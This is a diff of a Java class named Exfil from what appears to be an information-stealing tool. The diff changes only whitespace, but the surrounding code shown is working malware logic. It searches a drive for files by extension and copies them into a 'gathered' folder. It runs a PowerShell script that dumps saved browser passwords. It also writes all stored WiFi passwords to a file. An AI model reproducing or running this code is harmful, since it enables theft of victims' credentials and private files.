@@ -20,14 +20,14 @@ public class Exfil {
 	 * @return state of completion
 	 */
 	public static boolean exfilFiles(String root, ArrayList<String> exts) {
-		try {
+		try{
 			new File("gathered\\ExfiltratedFiles").mkdir();
 			for(String ext:exts)
 				for(String file:new ArrayList<String>(Arrays.asList(Utils.runCommand("c: && cd "+root+" && dir/b/s/a:-d *."+ext).split("\n"))))
 					if(!file.equals("File Not Found"))
 						FileUtils.copyFile(new File(file), new File("gathered\\ExfiltratedFiles\\"+file.substring(file.lastIndexOf("\\")+1)));
 			return true;
-		}catch (Exception e) {
+		}catch(Exception e){
 			return false;
 		}
 	}
@@ -39,14 +39,14 @@ public class Exfil {
 	 * @return state of completion
 	 */
 	public static boolean exfilBroserCreds() {
-		try {
+		try{
 			String content=new String(Files.readAllBytes(Paths.get("scripts\\BrowserCreds.ps1")));
 			content=content.replace("output.file", System.getProperty("user.dir")+"\\gathered\\BrowserPasswords.txt");
 			Files.write(Paths.get("scripts\\temp.ps1"), content.getBytes());
 			Utils.runPSScript("temp.ps1");
 			new File("scripts\\temp.ps1").delete();
 			return true;
-		}catch (Exception e) {
+		}catch(Exception e){
 			return false;
 		}
 	}
@@ -58,13 +58,13 @@ public class Exfil {
 	 */
 	public static boolean exfilWiFi() {
 		PrintWriter out=null;
-		try {
+		try{
 			out=new PrintWriter(new FileOutputStream(new File("gathered\\WiFiPasswords.txt")), true);
 			out.print(Utils.allWiFiPass());
 			return true;
-		}catch (Exception e) {
+		}catch(Exception e){
 			return false;
-		}finally {
+		}finally{
 			if(out!=null)
 				out.close();
 		}
